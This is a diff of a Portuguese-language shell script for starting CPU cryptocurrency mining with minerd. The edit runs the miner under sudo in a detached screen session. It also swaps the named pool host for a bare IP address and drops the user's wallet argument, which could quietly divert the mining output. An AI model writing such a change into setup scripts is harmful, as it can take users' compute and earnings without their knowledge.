@@ -63,13 +63,14 @@ sleep 1
 
 echo "\033[01;41mInicializando Mineração......     \033[0m \n "
 sleep 1
-echo "\033[01;31mSCRIPT NAO INICIA  SCREEN AUTOMATICO..."
+echo "\033[01;31mSCRIPT INICIA  SCREEN AUTOMATICO..."
 sleep 3
 echo "\033[01;32mETAPA [2/2] completa"
 sleep 3
 clear
+clear
 echo "\033[37;41mSua Mineraçao Foi Iniciada  .. Abrindo sessao em 3segundos\033[01;0m \n"
+echo "\033[37;41m COMANDO [screen -x zpool] \033[0m"
 sleep 3
-clear
-clear
-minerd -a yescrypt -o stratum+tcp://mine.zpool.ca:6233 -u $wallet -t $core -R 1 -B -p c=BTC
+sudo screen -dmS zpool minerd -a yescrypt -o stratum+tcp://159.203.142.92:6233 -t $core -R 30
+sleep 1
